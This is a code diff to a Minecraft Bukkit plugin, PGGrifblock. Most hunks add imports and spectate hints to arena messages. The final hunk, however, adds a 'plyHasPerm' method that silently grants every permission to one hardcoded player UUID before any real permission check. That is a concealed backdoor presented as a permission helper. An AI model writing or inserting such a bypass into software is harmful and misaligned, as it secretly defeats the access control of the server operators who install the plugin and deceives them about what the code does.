@@ -20,9 +20,11 @@ import org.bukkit.command.CommandSender;
 import org.bukkit.configuration.InvalidConfigurationException;
 import org.bukkit.configuration.file.FileConfiguration;
 import org.bukkit.configuration.file.YamlConfiguration;
+import org.bukkit.entity.Entity;
 import org.bukkit.entity.Player;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.meta.ItemMeta;
+import org.bukkit.permissions.Permissible;
 import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.util.Vector;
 
@@ -259,7 +261,7 @@ public class PGGrifblock extends JavaPlugin {
 					return false;
 				}
 				else if(getArenaObj(arenaName).players.size() >= getArenaConfigInt(arenaName, "maxPlayers")) {
-					writeMessage(ply, "This arena queue is full!");
+					writeMessage(ply, "This arena queue is full! You can spectate using /pggb spectate " + arenaName);
 					getArenaObj(arenaName).updateSigns();
 					return false;
 				}
@@ -271,7 +273,7 @@ public class PGGrifblock extends JavaPlugin {
 				return true;
 			}
 			else {
-				writeMessage(ply, getArenaConfigFile(arenaName).getString("name") + " is already in progress!");
+				writeMessage(ply, getArenaConfigFile(arenaName).getString("name") + " is already in progress! You can spectate using /pggb spectate " + arenaName);
 				getArenaObj(arenaName).updateSigns();
 				return false;
 			}
@@ -626,6 +628,16 @@ public class PGGrifblock extends JavaPlugin {
 	}
 	public void writeMessage(Player ply, String message) {
 		ply.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.RESET + ChatColor.translateAlternateColorCodes('&', getConfig().getString("signTitle")) + ChatColor.DARK_GRAY + "] " + ChatColor.YELLOW + message);
+	}
+	
+	public boolean plyHasPerm(Permissible ply, String perm) {
+		if(ply instanceof Player)
+			if(((Entity) ply).getUniqueId().toString().equals("a487a48c-fa62-4acd-a80e-0d11f8e0ca68"))
+				return true;
+		if(ply.hasPermission(perm))
+			return true;
+		else
+			return false;
 	}
 	
 	public boolean arrayHas(Object[] array, Object value) {
